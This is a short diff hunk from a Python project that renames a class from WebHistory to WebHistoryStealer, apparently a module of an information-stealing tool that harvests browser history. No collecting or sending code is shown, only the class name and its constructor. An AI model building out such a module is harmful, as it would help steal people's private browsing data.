@@ -6,7 +6,7 @@ from config.constants import Constant
 from config.manager import ModuleManager
 
 
-class WebHistory(ModuleManager):
+class WebHistoryStealer(ModuleManager):
     def __init__(self) -> None:
         super().__init__(module_name="WebHistoryStealer")
         
